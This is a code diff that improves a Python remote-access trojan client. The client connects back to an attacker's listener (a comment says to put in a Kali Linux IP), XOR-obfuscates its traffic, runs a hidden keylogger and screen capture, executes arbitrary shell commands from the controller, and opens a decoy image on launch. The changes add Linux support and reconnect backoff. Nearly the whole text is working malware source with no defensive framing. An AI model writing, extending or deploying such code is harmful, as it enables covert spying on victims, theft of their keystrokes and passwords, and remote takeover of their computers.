@@ -6,13 +6,12 @@ import time
 import threading
 import hashlib
 import base64
-import io
 import subprocess
 from pynput.keyboard import Listener
-from PIL import ImageGrab
+import mss  # Cross-platform screenshot capture library
 
 # --- Connection Settings ---
-SERVER_HOST = "127.0.0.1"  # Set attacker controller IP address
+SERVER_HOST = "127.0.0.1"  # Replace with your Kali Linux listener IP address
 SERVER_PORT = 8080
 
 # Pre-shared 8-bit XOR key for payload obfuscation (must match server)
@@ -21,7 +20,7 @@ KEY = b'simple_xor_key'
 # Lock mechanism for thread-safe log file access
 log_lock = threading.Lock()
 
-# Set current working directory to script path
+# Set current working directory to the script's directory
 try:
     script_dir = os.path.dirname(os.path.abspath(__file__))
     if script_dir:
@@ -31,12 +30,12 @@ except Exception:
 
 
 def xor_crypt(data: bytes) -> bytes:
-    """Applies symmetric XOR encryption/decryption using static key."""
+    """Applies symmetric XOR encryption/decryption using a static repeating key."""
     return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))
 
 
 def send_msg(sock: socket.socket, obj: dict):
-    """Encodes JSON payload, encrypts with XOR, and prepends 4-byte length header."""
+    """Encodes JSON payload, encrypts with XOR, and prepends a 4-byte big-endian length header."""
     try:
         raw = json.dumps(obj).encode('utf-8')
         enc = xor_crypt(raw)
@@ -47,7 +46,7 @@ def send_msg(sock: socket.socket, obj: dict):
 
 
 def recv_msg(sock: socket.socket) -> dict:
-    """Reads 4-byte length header prefix and decrypts full JSON binary frame."""
+    """Reads the 4-byte length header prefix, receives full frame payload, and decrypts JSON."""
     length_bytes = sock.recv(4)
     if not length_bytes:
         raise ConnectionError("C2 connection terminated.")
@@ -63,25 +62,27 @@ def recv_msg(sock: socket.socket) -> dict:
 
 
 def handle_screencap(sock: socket.socket):
-    """Captures primary desktop screen and returns JPEG encoded in base64 format."""
+    """Captures desktop screen across platforms (Windows/Linux) using mss and returns Base64 PNG."""
     try:
-        screenshot = ImageGrab.grab()
-        buffer = io.BytesIO()
-        screenshot.save(buffer, format="JPEG")
-        img_str = base64.b64encode(buffer.getvalue()).decode()
-        send_msg(sock, {"result": "[+] Screenshot captured!", "data": img_str})
+        with mss.mss() as sct:
+            # Capture the primary monitor
+            monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
+            sct_img = sct.grab(monitor)
+            png_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
+            img_str = base64.b64encode(png_bytes).decode('utf-8')
+            send_msg(sock, {"result": "[+] Screenshot captured successfully!", "data": img_str})
     except Exception as e:
-        send_msg(sock, {"result": f"[-] Screenshot failed: {e}"})
+        send_msg(sock, {"result": f"[-] Screenshot failed: {str(e)}"})
 
 
 def handle_hash(sock: socket.socket, filename: str):
-    """Computes SHA-256 hash checksum for requested local file."""
+    """Computes SHA-256 hash checksum for requested local file in a thread-safe manner."""
     try:
         target = filename if filename else "logs.txt"
         if not os.path.exists(target):
             send_msg(sock, {"result": f"[-] Error: {target} not found."})
             return
-        
+
         h = hashlib.sha256()
         with log_lock:
             with open(target, "rb") as f:
@@ -89,22 +90,25 @@ def handle_hash(sock: socket.socket, filename: str):
                     h.update(chunk)
         send_msg(sock, {"result": f"[+] SHA256 ({target}): {h.hexdigest()}"})
     except Exception as e:
-        send_msg(sock, {"result": f"[-] Hash error: {str(e)}"})
+        send_msg(sock, {"result": f"[-] Hash calculation error: {str(e)}"})
 
 
 def start_keylogger():
-    """Asynchronous keylogger recording key strokes to logs.txt in thread-safe mode."""
+    """Asynchronous keylogger recording keystrokes to logs.txt in thread-safe mode."""
     def on_press(key):
         with log_lock:
             with open("logs.txt", "a", encoding="utf-8") as f:
                 f.write(f"{key} ")
 
-    with Listener(on_press=on_press) as listener:
-        listener.join()
+    try:
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    except Exception:
+        pass
 
 
 def execute_command(cmd: str) -> str:
-    """Executes arbitrary OS shell command and returns output."""
+    """Executes arbitrary OS shell command and returns formatted standard output or error."""
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
         return output.decode('utf-8', errors='replace')
@@ -115,26 +119,35 @@ def execute_command(cmd: str) -> str:
 
 
 def connect_c2():
-    """Main client connection loop with automatic reconnect logic."""
-    # Launch decoy image if present
+    """Main client loop featuring exponential reconnection strategy and payload handler."""
+    # Optional decoy launch on execution
     if os.path.exists("image.jpg"):
         try:
-            os.startfile("image.jpg")
+            if sys.platform.startswith('win'):
+                os.startfile("image.jpg")
+            elif sys.platform.startswith('linux'):
+                subprocess.Popen(["xdg-open", "image.jpg"])
         except Exception:
             pass
 
-    # Start background keylogger thread
+    # Start background keylogger listener thread
     threading.Thread(target=start_keylogger, daemon=True).start()
+
+    # Connection retry parameters
+    retry_delay = 5
 
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((SERVER_HOST, SERVER_PORT))
+            retry_delay = 5  # Reset delay upon successful connection
 
             while True:
                 msg = recv_msg(sock)
-                action = msg.get("action", "")
+                if not msg:
+                    break
 
+                action = msg.get("action", "")
                 if action == "screencap":
                     handle_screencap(sock)
                 elif action == "keylog":
@@ -148,7 +161,7 @@ def connect_c2():
                 elif action == "hash":
                     handle_hash(sock, msg.get("filename", "logs.txt"))
                 elif action == "terminate":
-                    send_msg(sock, {"result": "[+] Terminating payload process."})
+                    send_msg(sock, {"result": "[+] Terminating payload process gracefully."})
                     sock.close()
                     sys.exit(0)
                 elif action:
@@ -156,7 +169,14 @@ def connect_c2():
                     send_msg(sock, {"result": out})
 
         except Exception:
-            time.sleep(5)
+            # Connection failed or lost; wait before retrying
+            time.sleep(retry_delay)
+            retry_delay = min(retry_delay * 2, 60)
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
 
 
 if __name__ == "__main__":
